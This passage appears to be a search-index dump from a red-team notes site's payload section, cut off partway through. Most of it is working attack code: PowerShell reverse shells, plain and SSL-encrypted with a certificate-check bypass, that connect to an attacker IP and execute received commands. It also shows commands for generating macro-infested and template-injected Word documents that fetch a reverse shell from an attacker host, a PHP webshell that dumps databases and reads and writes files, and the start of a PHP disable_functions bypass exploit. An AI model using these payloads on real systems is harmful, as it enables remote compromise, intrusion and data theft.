&lt;listening_port&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#powershell-50-default","title":"PowerShell 5.0 (default)","text":"<pre><code># Variables\n$IPAddress = '&lt;attacker_ip&gt;'\n$Port      = '&lt;listening_port&gt;'\n\n# Reverse Shell\n$RevShellClient = [System.Net.Sockets.TCPClient]::new($IPAddress,$Port)\n$Stream = $RevShellClient.GetStream()\n[byte[]]$DataBuffer = 0..65535 | % {0}\n$OutputBuffer = [System.IO.StringWriter]::new()\n[System.Console]::SetOut($OutputBuffer)\nwhile (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {\n    Try {\n        $Command = [System.Text.ASCIIEncoding]::new().GetString($DataBuffer,0,$i)\n        $CommandOutput = (iex $Command *&gt;&amp;1 | Out-String)\n    } Catch {$CommandOutput = \"$($Error[0])`n\"}\n    $OutputBuffer.Write($CommandOutput)\n    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '&gt; ' \n    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)\n    $Stream.Write($PromptBytes,0,$PromptBytes.Length)\n    $Stream.Flush()\n    $OutputBuffer.GetStringBuilder().Clear() | Out-Null\n}\n$OutputBuffer.Close()\n$RevShellClient.Close()\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#powershell-20","title":"PowerShell 2.0","text":"<pre><code># Variables\n$IPAddress = '&lt;attacker_ip&gt;'\n$Port      = '&lt;listening_port&gt;'\n\n# Reverse Shell (PowerShell 2.0 Compatible)\n$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient($IPAddress, $Port)\n$Stream = $RevShellClient.GetStream()\n[byte[]]$DataBuffer = 0..65535 | % {0}\n$OutputBuffer = New-Object -TypeName System.IO.StringWriter\n[System.Console]::SetOut($OutputBuffer)\nwhile (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {\n    Try {\n        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)\n        $CommandOutput = (iex $Command 2&gt;&amp;1 | Out-String)\n    } Catch {$CommandOutput = \"$($Error[0])`n\"}\n    $OutputBuffer.Write($CommandOutput)\n    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '&gt; '\n    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)\n    $Stream.Write($PromptBytes,0,$PromptBytes.Length)\n    $Stream.Flush()\n    $OutputBuffer.GetStringBuilder().Clear() | Out-Null\n}\n$OutputBuffer.Close()\n$RevShellClient.Close()\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#ssl-encrypted-reverse-shell","title":"SSL Encrypted Reverse Shell","text":"<p>By prepending the reverse shell with a custom .NET class that bypasses the self-signed certificate check for SSL streams, you can establish a completely encrypted reverse shell.</p> <p>Info</p> <p>If you would like to take this a step further using assembly reflection, see my Loading .NET into PowerShell note.</p> <p>In both PowerShell 2.0 and 5.0, the attacker's listener is the same. <pre><code># Listener with SSL support and readline wrapper\nrlwrap ncat -nlvp &lt;listening_port&gt; --ssl\n</code></pre></p>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#powershell-50-default_1","title":"PowerShell 5.0 (default)","text":"<pre><code># Variables\n$IPAddress = '&lt;attacker_ip&gt;'\n$Port      = '&lt;listening_port&gt;'\n\n# Custom Self-Signed Certificate Bypass .NET Class\n$CertificateBypasses = @'\nusing System;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Net.Security;\nusing System.Security.Cryptography.X509Certificates;\npublic class SelfSignedCerts\n{\n    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)\n    {\n        return true;\n    }\n    public static SslStream Stream(TcpClient client)\n    {\n        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);\n    }\n}\n'@\nAdd-Type $CertificateBypasses\n\n# SSL Encrypted Reverse Shell\n$RevShellClient = [System.Net.Sockets.TCPClient]::new($IPAddress, $Port)\n$Stream = [SelfSignedCerts]::Stream($RevShellClient)\n$Stream.AuthenticateAsClient('')\n[byte[]]$DataBuffer = 0..65535 | % {0}\n$OutputBuffer = [System.IO.StringWriter]::new()\n[System.Console]::SetOut($OutputBuffer)\nwhile (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {\n    Try {\n        $Command = [System.Text.ASCIIEncoding]::new().GetString($DataBuffer,0,$i)\n        $CommandOutput = (iex $Command *&gt;&amp;1 | Out-String)\n    } Catch {$CommandOutput = \"$($Error[0])`n\"}\n    $OutputBuffer.Write($CommandOutput)\n    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '&gt; '\n    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)\n    $Stream.Write($PromptBytes,0,$PromptBytes.Length)\n    $Stream.Flush()\n    $OutputBuffer.GetStringBuilder().Clear() | Out-Null\n}\n$OutputBuffer.Close()\n$RevShellClient.Close()\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#powershell-20_1","title":"PowerShell 2.0","text":"<pre><code># Variables\n$IPAddress = '&lt;attacker_ip&gt;'\n$Port      = '&lt;listening_port&gt;'\n\n# Custom Self-Signed Certificate Bypass .NET Class\n$CertificateBypasses = @'\nusing System;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Net.Security;\nusing System.Security.Cryptography.X509Certificates;\npublic class SelfSignedCerts\n{\n    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)\n    {\n        return true;\n    }\n    public static SslStream Stream(TcpClient client)\n    {\n        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);\n    }\n}\n'@\nAdd-Type $CertificateBypasses\n\n# SSL Encrypted Reverse Shell (PowerShell 2.0 Compatible)\n$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient($IPAddress, $Port)\n$Stream = [SelfSignedCerts]::Stream($RevShellClient)\n$Stream.AuthenticateAsClient('')\n[byte[]]$DataBuffer = 0..65535 | % {0}\n$OutputBuffer = New-Object -TypeName System.IO.StringWriter\n[System.Console]::SetOut($OutputBuffer)\nwhile (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {\n    Try {\n        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)\n        $CommandOutput = (iex $Command 2&gt;&amp;1 | Out-String)\n    } Catch {$CommandOutput = \"$($Error[0])`n\"}\n    $OutputBuffer.Write($CommandOutput)\n    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '&gt; '\n    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)\n    $Stream.Write($PromptBytes,0,$PromptBytes.Length)\n    $Stream.Flush()\n    $OutputBuffer.GetStringBuilder().Clear() | Out-Null\n}\n$OutputBuffer.Close()\n$RevShellClient.Close()\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/Microsoft%20Office%20Macros/Remote%20Template%20Injection/","title":"Remote Template Injection","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/07.%20Payloads/Microsoft%20Office%20Macros/Remote%20Template%20Injection/#overview","title":"Overview","text":"<p>Remote Template Injection is an exploit where an attacker can manipulate or inject templates into a Word document remotely. This vulnerability can be exploited to execute arbitrary code or carry out other malicious activities when the document is opened or processed.</p> <p>This exploit even allows <code>.docx</code> to execute macros, which otherwise wouldn't be possible.</p>"},{"location":"Red%20Cell/07.%20Payloads/Microsoft%20Office%20Macros/Remote%20Template%20Injection/#example","title":"Example","text":"<p>Tip</p> <p>My custom reverse shell generator can be found here: https://github.com/tylerdotrar/PoorMansArmory</p> <ul> <li> <p>PoorMansArmory/officemacros/Get-MacroInfestedWordDoc.ps1 <pre><code># Synopsis:\n# Generate Macro Infested Word 97-2003 Documents (.doc)\n# \n# Parameters:\n#   -DocumentName   --&gt;  Output name of the malicious Word Document (.doc)\n#   -PayloadURL     --&gt;  URL of the hosted payload that the macro downloads and executes\n#   -MacroContents  --&gt;  Advanced: User inputs custom macro instead of the generated one\n#   -Help           --&gt;  Return Get-Help information\n\n# Example:\nGet-MacroInfestedWordDoc -DocumentName invoice.doc -PayloadURL http://&lt;attacker_ip&gt;/revshell\n</code></pre></p> </li> <li> <p>PoorMansArmory/officemacros/Get-TemplateInjectedPayload.ps1 <pre><code># Synopsis:\n# Generate Macro Infested Word Template (.dotm) an Inject into a Word Document (.docx)\n# \n# Parameters:\n#   -TemplateURL    --&gt;  URL where the malicious Word Template (.dotm) will be hosted\n#   -PayloadURL     --&gt;  URL of the hosted payload that the macro downloads and executes\n#   -Document       --&gt;  Advanced: Target templated Word Document (.docx) to inject\n#   -MacroContents  --&gt;  Advanced: User inputs custom macro instead of the generated one\n#   -Help           --&gt;  Return Get-Help information\n\n# Example:\nGet-TemplateInjectedPayload -TemplateURL http://&lt;attacker_ip&gt;/office/update.dotm -PayloadURL http://&lt;attacker_ip&gt;/revshell\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/PHP/Limited%20Webshell/","title":"Limited Webshell","text":"<p>Info</p> <p>Link: https://raw.githubusercontent.com/carlospolop/phpwebshelllimited/master/webshell.php</p> <p>This webshell was created for those times where you can upload a PHP webshell but you cannot execute commands due to disabled functions and you can only interact with the filesystem using PHP capabilities.</p> <pre><code>&lt;?php\n\n############################\n#### DATABASE FUNCTIONS ####\n############################\n\n$db = [];\n$information_schema=[\"ALL_PLUGINS\", \"APPLICABLE_ROLES\", \"CHARACTER_SETS\", \"CHECK_CONSTRAINTS\", \"COLLATIONS\", \"COLLATION_CHARACTER_SET_APPLICABILITY\", \"COLUMNS\", \"COLUMN_PRIVILEGES\", \"ENGINES\", \"ENABLED_ROLES\", \"EVENTS\", \"FILES\", \"GLOBAL_STATUS\", \"GLOBAL_VARIABLES\", \"KEY_CACHES\", \"KEY_COLUMN_USAGE\", \"OPTIMIZER_TRACE\", \"PARAMETERS\", \"PARTITIONS\", \"PLUGINS\", \"PROCESSLIST\", \"PROFILING\", \"REFERENTIAL_CONSTRAINTS\", \"ROUTINES\", \"SCHEMATA\", \"SCHEMA_PRIVILEGES\", \"SESSION_STATUS\", \"SESSION_VARIABLES\", \"STATISTICS\", \"SYSTEM_VARIABLES\", \"TABLES\", \"TABLESPACES\", \"TABLE_CONSTRAINTS\", \"TABLE_PRIVILEGES\", \"TRIGGERS\", \"USER_PRIVILEGES\", \"VIEWS\", \"INNODB_LOCKS\", \"INNODB_TRX\", \"INNODB_SYS_DATAFILES\", \"INNODB_FT_CONFIG\", \"INNODB_SYS_VIRTUAL\", \"INNODB_CMP\", \"INNODB_FT_BEING_DELETED\", \"INNODB_CMP_RESET\", \"INNODB_CMP_PER_INDEX\", \"INNODB_CMPMEM_RESET\", \"INNODB_FT_DELETED\", \"INNODB_BUFFER_PAGE_LRU\", \"INNODB_LOCK_WAITS\", \"INNODB_TEMP_TABLE_INFO\", \"INNODB_SYS_INDEXES\", \"INNODB_SYS_TABLES\", \"INNODB_SYS_FIELDS\", \"INNODB_CMP_PER_INDEX_RESET\", \"INNODB_BUFFER_PAGE\", \"INNODB_FT_DEFAULT_STOPWORD\", \"INNODB_FT_INDEX_TABLE\", \"INNODB_FT_INDEX_CACHE\", \"INNODB_SYS_TABLESPACES\", \"INNODB_METRICS\", \"INNODB_SYS_FOREIGN_COLS\", \"INNODB_CMPMEM\", \"INNODB_BUFFER_POOL_STATS\", \"INNODB_SYS_COLUMNS\", \"INNODB_SYS_FOREIGN\", \"INNODB_SYS_TABLESTATS\", \"GEOMETRY_COLUMNS\", \"SPATIAL_REF_SYS\", \"CLIENT_STATISTICS\", \"INDEX_STATISTICS\", \"USER_STATISTICS\", \"INNODB_MUTEXES\", \"TABLE_STATISTICS\", \"INNODB_TABLESPACES_ENCRYPTION\", \"USER_VARIABLES\", \"INNODB_TABLESPACES_SCRUBBING\", \"INNODB_SYS_SEMAPHORE_WAITS\"];\n$mysql=[\"COLUMNS_PRIV\", \"COLUMN_STATS\", \"DB\", \"ENGINE_COST\", \"EVENT\", \"FUNC\", \"GENERAL_LOG\", \"GTID_EXECUTED\", \"GTID_SLAVE_POS\", \"HELP_CATEGORY\", \"HELP_KEYWORD\", \"HELP_RELATION\", \"HELP_TOPIC\", \"HOST\", \"INDEX_STATS\", \"INNODB_INDEX_STATS\", \"INNODB_TABLE_STATS\", \"NDB_BINLOG_INDEX\", \"PLUGIN\", \"PROC\", \"PROCS_PRIV\", \"PROXIES_PRIV\", \"ROLES_MAPPING\", \"SERVER_COST\", \"SERVERS\", \"SLAVE_MASTER_INFO\", \"SLAVE_RELAY_LOG_INFO\", \"SLAVE_WORKER_INFO\", \"SLOW_LOG\", \"TABLE_STATS\", \"TABLES_PRIV\", \"TIME_ZONE\", \"TIME_ZONE_LEAP_SECOND\", \"TIME_ZONE_NAME\", \"TIME_ZONE_TRANSITION\", \"TIME_ZONE_TRANSITION_TYPE\", \"TRANSACTION_REGISTRY\", \"USER\"];\n$performance_schema=[\"ACCOUNTS\", \"COND_INSTANCES\", \"EVENTS_STAGES_CURRENT\", \"EVENTS_STAGES_HISTORY\", \"EVENTS_STAGES_HISTORY_LONG\", \"EVENTS_STAGES_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME\", \"EVENTS_STAGES_SUMMARY_BY_HOST_BY_EVENT_NAME\", \"EVENTS_STAGES_SUMMARY_BY_THREAD_BY_EVENT_NAME\", \"EVENTS_STAGES_SUMMARY_BY_USER_BY_EVENT_NAME\", \"EVENTS_STAGES_SUMMARY_GLOBAL_BY_EVENT_NAME\", \"EVENTS_STATEMENTS_CURRENT\", \"EVENTS_STATEMENTS_HISTORY\", \"EVENTS_STATEMENTS_HISTORY_LONG\", \"EVENTS_STATEMENTS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME\", \"EVENTS_STATEMENTS_SUMMARY_BY_DIGEST\", \"EVENTS_STATEMENTS_SUMMARY_BY_HOST_BY_EVENT_NAME\", \"EVENTS_STATEMENTS_SUMMARY_BY_PROGRAM\", \"EVENTS_STATEMENTS_SUMMARY_BY_THREAD_BY_EVENT_NAME\", \"EVENTS_STATEMENTS_SUMMARY_BY_USER_BY_EVENT_NAME\", \"EVENTS_STATEMENTS_SUMMARY_GLOBAL_BY_EVENT_NAME\", \"EVENTS_TRANSACTIONS_CURRENT\", \"EVENTS_TRANSACTIONS_HISTORY\", \"EVENTS_TRANSACTIONS_HISTORY_LONG\", \"EVENTS_TRANSACTIONS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME\", \"EVENTS_TRANSACTIONS_SUMMARY_BY_HOST_BY_EVENT_NAME\", \"EVENTS_TRANSACTIONS_SUMMARY_BY_THREAD_BY_EVENT_NAME\", \"EVENTS_TRANSACTIONS_SUMMARY_BY_USER_BY_EVENT_NAME\", \"EVENTS_TRANSACTIONS_SUMMARY_GLOBAL_BY_EVENT_NAME\", \"EVENTS_WAITS_CURRENT\", \"EVENTS_WAITS_HISTORY\", \"EVENTS_WAITS_HISTORY_LONG\", \"EVENTS_WAITS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME\", \"EVENTS_WAITS_SUMMARY_BY_HOST_BY_EVENT_NAME\", \"EVENTS_WAITS_SUMMARY_BY_INSTANCE\", \"EVENTS_WAITS_SUMMARY_BY_THREAD_BY_EVENT_NAME\", \"EVENTS_WAITS_SUMMARY_BY_USER_BY_EVENT_NAME\", \"EVENTS_WAITS_SUMMARY_GLOBAL_BY_EVENT_NAME\", \"FILE_INSTANCES\", \"FILE_SUMMARY_BY_EVENT_NAME\", \"FILE_SUMMARY_BY_INSTANCE\", \"GLOBAL_STATUS\", \"GLOBAL_VARIABLES\", \"HOST_CACHE\", \"HOSTS\", \"MEMORY_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME\", \"MEMORY_SUMMARY_BY_HOST_BY_EVENT_NAME\", \"MEMORY_SUMMARY_BY_THREAD_BY_EVENT_NAME\", \"MEMORY_SUMMARY_BY_USER_BY_EVENT_NAME\", \"MEMORY_SUMMARY_GLOBAL_BY_EVENT_NAME\", \"METADATA_LOCKS\", \"MUTEX_INSTANCES\", \"OBJECTS_SUMMARY_GLOBAL_BY_TYPE\", \"PERFORMANCE_TIMERS\", \"PREPARED_STATEMENTS_INSTANCES\", \"REPLICATION_APPLIER_CONFIGURATION\", \"REPLICATION_APPLIER_STATUS\", \"REPLICATION_APPLIER_STATUS_BY_COORDINATOR\", \"REPLICATION_APPLIER_STATUS_BY_WORKER\", \"REPLICATION_CONNECTION_CONFIGURATION\", \"REPLICATION_CONNECTION_STATUS\", \"REPLICATION_GROUP_MEMBER_STATS\", \"REPLICATION_GROUP_MEMBERS\", \"RWLOCK_INSTANCES\", \"SESSION_ACCOUNT_CONNECT_ATTRS\", \"SESSION_CONNECT_ATTRS\", \"SESSION_STATUS\", \"SESSION_VARIABLES\", \"SETUP_ACTORS\", \"SETUP_CONSUMERS\", \"SETUP_INSTRUMENTS\", \"SETUP_OBJECTS\", \"SETUP_TIMERS\", \"SOCKET_INSTANCES\", \"SOCKET_SUMMARY_BY_EVENT_NAME\", \"SOCKET_SUMMARY_BY_INSTANCE\", \"STATUS_BY_ACCOUNT\", \"STATUS_BY_HOST\", \"STATUS_BY_THREAD\", \"STATUS_BY_USER\", \"TABLE_HANDLES\", \"TABLE_IO_WAITS_SUMMARY_BY_INDEX_USAGE\", \"TABLE_IO_WAITS_SUMMARY_BY_TABLE\", \"TABLE_LOCK_WAITS_SUMMARY_BY_TABLE\", \"THREADS\", \"USER_VARIABLES_BY_THREAD\", \"USERS\", \"VARIABLES_BY_THREAD\"];\n$sys=['HOST_SUMMARY', 'HOST_SUMMARY_BY_FILE_IO', 'HOST_SUMMARY_BY_FILE_IO_TYPE', 'HOST_SUMMARY_BY_STAGES', 'HOST_SUMMARY_BY_STATEMENT_LATENCY', 'HOST_SUMMARY_BY_STATEMENT_TYPE', 'INNODB_BUFFER_STATS_BY_SCHEMA', 'INNODB_BUFFER_STATS_BY_TABLE', 'INNODB_LOCK_WAITS', 'IO_BY_THREAD_BY_LATENCY', 'IO_GLOBAL_BY_FILE_BY_BYTES', 'IO_GLOBAL_BY_FILE_BY_LATENCY', 'IO_GLOBAL_BY_WAIT_BY_BYTES', 'IO_GLOBAL_BY_WAIT_BY_LATENCY', 'LATEST_FILE_IO', 'MEMORY_BY_HOST_BY_CURRENT_BYTES', 'MEMORY_BY_THREAD_BY_CURRENT_BYTES', 'MEMORY_BY_USER_BY_CURRENT_BYTES', 'MEMORY_GLOBAL_BY_CURRENT_BYTES', 'MEMORY_GLOBAL_TOTAL', 'METRICS', 'PROCESSLIST', 'PS_CHECK_LOST_INSTRUMENTATION', 'SCHEMA_AUTO_INCREMENT_COLUMNS', 'SCHEMA_INDEX_STATISTICS', 'SCHEMA_OBJECT_OVERVIEW', 'SCHEMA_REDUNDANT_INDEXES', 'SCHEMA_TABLE_LOCK_WAITS', 'SCHEMA_TABLE_STATISTICS', 'SCHEMA_TABLE_STATISTICS_WITH_BUFFER', 'SCHEMA_TABLES_WITH_FULL_TABLE_SCANS', 'SCHEMA_UNUSED_INDEXES', 'SESSION', 'SESSION_SSL_STATUS', 'STATEMENT_ANALYSIS', 'STATEMENTS_WITH_ERRORS_OR_WARNINGS', 'STATEMENTS_WITH_FULL_TABLE_SCANS', 'STATEMENTS_WITH_RUNTIMES_IN_95TH_PERCENTILE', 'STATEMENTS_WITH_SORTING', 'STATEMENTS_WITH_TEMP_TABLES', 'SYS_CONFIG', 'USER_SUMMARY', 'USER_SUMMARY_BY_FILE_IO', 'USER_SUMMARY_BY_FILE_IO_TYPE', 'USER_SUMMARY_BY_STAGES', 'USER_SUMMARY_BY_STATEMENT_LATENCY', 'USER_SUMMARY_BY_STATEMENT_TYPE', 'VERSION', 'WAIT_CLASSES_GLOBAL_BY_AVG_LATENCY', 'WAIT_CLASSES_GLOBAL_BY_LATENCY', 'WAITS_BY_HOST_BY_LATENCY', 'WAITS_BY_USER_BY_LATENCY', 'WAITS_GLOBAL_BY_LATENCY', 'X$HOST_SUMMARY', 'X$HOST_SUMMARY_BY_FILE_IO', 'X$HOST_SUMMARY_BY_FILE_IO_TYPE', 'X$HOST_SUMMARY_BY_STAGES', 'X$HOST_SUMMARY_BY_STATEMENT_LATENCY', 'X$HOST_SUMMARY_BY_STATEMENT_TYPE', 'X$INNODB_BUFFER_STATS_BY_SCHEMA', 'X$INNODB_BUFFER_STATS_BY_TABLE', 'X$INNODB_LOCK_WAITS', 'X$IO_BY_THREAD_BY_LATENCY', 'X$IO_GLOBAL_BY_FILE_BY_BYTES', 'X$IO_GLOBAL_BY_FILE_BY_LATENCY', 'X$IO_GLOBAL_BY_WAIT_BY_BYTES', 'X$IO_GLOBAL_BY_WAIT_BY_LATENCY', 'X$LATEST_FILE_IO', 'X$MEMORY_BY_HOST_BY_CURRENT_BYTES', 'X$MEMORY_BY_THREAD_BY_CURRENT_BYTES', 'X$MEMORY_BY_USER_BY_CURRENT_BYTES', 'X$MEMORY_GLOBAL_BY_CURRENT_BYTES', 'X$MEMORY_GLOBAL_TOTAL', 'X$PROCESSLIST', 'X$PS_DIGEST_95TH_PERCENTILE_BY_AVG_US', 'X$PS_DIGEST_AVG_LATENCY_DISTRIBUTION', 'X$PS_SCHEMA_TABLE_STATISTICS_IO', 'X$SCHEMA_FLATTENED_KEYS', 'X$SCHEMA_INDEX_STATISTICS', 'X$SCHEMA_TABLE_LOCK_WAITS', 'X$SCHEMA_TABLE_STATISTICS', 'X$SCHEMA_TABLE_STATISTICS_WITH_BUFFER', 'X$SCHEMA_TABLES_WITH_FULL_TABLE_SCANS', 'X$SESSION', 'X$STATEMENT_ANALYSIS', 'X$STATEMENTS_WITH_ERRORS_OR_WARNINGS', 'X$STATEMENTS_WITH_FULL_TABLE_SCANS', 'X$STATEMENTS_WITH_RUNTIMES_IN_95TH_PERCENTILE', 'X$STATEMENTS_WITH_SORTING', 'X$STATEMENTS_WITH_TEMP_TABLES', 'X$USER_SUMMARY', 'X$USER_SUMMARY_BY_FILE_IO', 'X$USER_SUMMARY_BY_FILE_IO_TYPE', 'X$USER_SUMMARY_BY_STAGES', 'X$USER_SUMMARY_BY_STATEMENT_LATENCY', 'X$USER_SUMMARY_BY_STATEMENT_TYPE', 'X$WAIT_CLASSES_GLOBAL_BY_AVG_LATENCY', 'X$WAIT_CLASSES_GLOBAL_BY_LATENCY', 'X$WAITS_BY_HOST_BY_LATENCY', 'X$WAITS_BY_USER_BY_LATENCY', 'X$WAITS_GLOBAL_BY_LATENCY'];\n\nfunction getData($dbh, $columns, $tablename, $dbname){\n  global $db;\n  $columns_str = implode(\",\", $columns);\n  $sql = \"SELECT $columns_str FROM $dbname.$tablename;\";\n  #echo $sql.\"\\n\";\n  foreach ($dbh-&gt;query($sql) as $row) {\n    array_push($db[$dbname][$tablename][\"data\"], array());\n    echo \"&lt;tr&gt;\\n\";\n    foreach ($columns as &amp;$colname){\n      $c = count($db[$dbname][$tablename][\"data\"]);\n      $db[$dbname][$tablename][\"data\"][$c-1][$colname] = $row[$colname];\n      echo \"\\t&lt;td&gt;\".$row[$colname].\"&lt;/td&gt;\\n\";\n    }\n    echo \"&lt;/tr&gt;\\n\";\n  }\n}\n\nfunction getColumns($dbh, $tablename, $dbname){\n  global $db;\n  $sql = \"SELECT column_name FROM information_schema.columns WHERE table_name='$tablename' and table_schema='$dbname';\";\n  #echo $sql.\"\\n\";\n  echo \"&lt;div id='$tablename.$dbname'&gt;\";\n  echo '&lt;table style=\"width:100%\"&gt;'.\"\\n\";\n  echo \"&lt;tr&gt;\\n\";\n  foreach ($dbh-&gt;query($sql) as $row) {\n    array_push($db[$dbname][$tablename][\"columns\"], $row['column_name']);\n    echo \"\\t&lt;th&gt;\".$row['column_name'].\"&lt;/th&gt;\\n\";\n  }\n  echo \"&lt;/tr&gt;\\n\";\n  getData($dbh, $db[$dbname][$tablename][\"columns\"], $tablename, $dbname);\n  echo \"&lt;/table&gt;&lt;/div&gt;\\n\";\n  echo \"&lt;br&gt;\\n\";\n}\n\nfunction getTables($dbh, $dbname, $checkDefault) {\n  global $db, $information_schema, $mysql, $performance_schema, $sys;\n  $sql = \"SELECT table_name FROM information_schema.tables WHERE table_schema='$dbname';\";\n  #echo $sql.\"\\n\";\n  foreach ($dbh-&gt;query($sql) as $row) {\n    $db[$dbname][$row['table_name']][\"columns\"] = array();\n    $db[$dbname][$row['table_name']][\"data\"] = array();\n    if (! $checkDefault){\n      if ($dbname === \"information_schema\" &amp;&amp; in_array(strtoupper($row['table_name']),$information_schema)){\n        continue;\n      }\n      elseif ($dbname === \"mysql\" &amp;&amp; in_array(strtoupper($row['table_name']),$mysql)){\n        continue;\n      }\n      elseif ($dbname === \"performance_schema\" &amp;&amp; in_array(strtoupper($row['table_name']),$performance_schema)){\n        continue;\n      }\n      elseif ($dbname === \"sys\" &amp;&amp; in_array(strtoupper($row['table_name']),$sys)){\n        continue;\n      }\n    }\n    echo \"&lt;h3&gt;Table: \".$row['table_name'].\"&lt;/h3&gt;&lt;br&gt;\";\n    getColumns($dbh, $row['table_name'], $dbname);\n  }\n}\n\nfunction dumpDb($mysqlUserName, $mysqlPassword, $mysqlHostName, $checkDefault){\n  global $db;\n  $dbh = new PDO(\"mysql:host=$mysqlHostName;\",$mysqlUserName, $mysqlPassword);\n  $sql = $dbh-&gt;query('SHOW DATABASES');\n  $dbnames_results = $sql-&gt;fetchAll();\n\n  foreach ($dbnames_results as &amp;$dbname) {\n    $db[$dbname[0]] = array();\n    echo \"&lt;h2&gt;Database: \".$dbname[0].\"&lt;/h2&gt;&lt;br&gt;\";\n    getTables($dbh, $dbname[0], $checkDefault);\n  }\n}\n\n\n################################\n##### FILESYSTEM FUNCTIONS #####\n################################\n\nfunction printPerms($filepath){\n  $perms = fileperms('/etc/passwd');\n\n  switch ($perms &amp; 0xF000) {\n      case 0xC000: // socket\n          $info = 's';\n          break;\n      case 0xA000: // symbolic link\n          $info = 'l';\n          break;\n      case 0x8000: // regular\n          $info = 'r';\n          break;\n      case 0x6000: // block special\n          $info = 'b';\n          break;\n      case 0x4000: // directory\n          $info = 'd';\n          break;\n      case 0x2000: // character special\n          $info = 'c';\n          break;\n      case 0x1000: // FIFO pipe\n          $info = 'p';\n          break;\n      default: // unknown\n          $info = 'u';\n  }\n\n  // Owner\n  $info .= (($perms &amp; 0x0100) ? 'r' : '-');\n  $info .= (($perms &amp; 0x0080) ? 'w' : '-');\n  $info .= (($perms &amp; 0x0040) ?\n              (($perms &amp; 0x0800) ? 's' : 'x' ) :\n              (($perms &amp; 0x0800) ? 'S' : '-'));\n\n  // Group\n  $info .= (($perms &amp; 0x0020) ? 'r' : '-');\n  $info .= (($perms &amp; 0x0010) ? 'w' : '-');\n  $info .= (($perms &amp; 0x0008) ?\n              (($perms &amp; 0x0400) ? 's' : 'x' ) :\n              (($perms &amp; 0x0400) ? 'S' : '-'));\n\n  // World\n  $info .= (($perms &amp; 0x0004) ? 'r' : '-');\n  $info .= (($perms &amp; 0x0002) ? 'w' : '-');\n  $info .= (($perms &amp; 0x0001) ?\n              (($perms &amp; 0x0200) ? 't' : 'x' ) :\n              (($perms &amp; 0x0200) ? 'T' : '-'));\n\n  echo \"$info $filepath\\n\";\n}\n\n\nfunction listDir($dir){\n  echo \"Listing $dir\\n\";\n  $filenames  = scandir($dir);\n  foreach ($filenames as $filename) {\n    if ($filename != \".\" &amp;&amp; $filename != \"..\"){\n      $filepath = \"$dir/$filename\";\n      printPerms($filepath);\n    }\n  }\n}\n\nfunction readAFile($filepath){\n  if (file_exists($filepath)){\n    if (is_readable($filepath)) {\n      echo \"Reading $filepath\\n\";\n      echo file_get_contents($filepath);\n    }\n    else{\n      echo \"$filepath: Permission denied\\n\";\n    }\n  }\n  else{\n    echo \"$filepath: File doesn't exist\\n\";\n  }\n}\n\nfunction writeAFile($filepath, $content){\n  file_put_contents($filepath, $content);\n}\n\nfunction createADir($dirpath, $perms){\n  if (! mkdir($dirpath, intval($perms, 8))){\n    echo \"Error creating the folder $dirpath\\n\";\n  }\n  else{\n    echo \"$dirpath was created\\n\";\n  }\n}\n\nfunction changePerms($dirpath, $perms){\n  if (! chmod($dirpath, intval($perms, 8))){\n    echo \"Error changing permissions of $dirpath\\n\";\n  }\n  else{\n    echo \"Permissions of $dirpath changed correctly\\n\";\n  }\n}\n\n\n\n####################################\n######### CHECK FUNCTIONS ##########\n####################################\n\nfunction check_exec_function($disabled, $func){\n  if (!in_array($func, $disabled)){\n    echo \"&lt;div style='color:red;'&gt;$func is enabled!!&lt;/div&gt;\\n\";\n  }\n  else{\n    echo \"&lt;div style='color:green;'&gt;$func is disabled&lt;/div&gt;\\n\";\n  }\n}\n\nfunction check_exec_functions() {\n  $disabled = explode(',', ini_get('disable_functions'));\n  $funcs = [\"exec\", \"passthru\", \"system\", \"shell_exec\", \"popen\", \"proc_open\", \"pcntl_exec\", \"mail\", \"putenv\"];\n  foreach ($funcs as $func) {\n    check_exec_function($disabled, $func);\n  }\n}\n\n\n\n\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    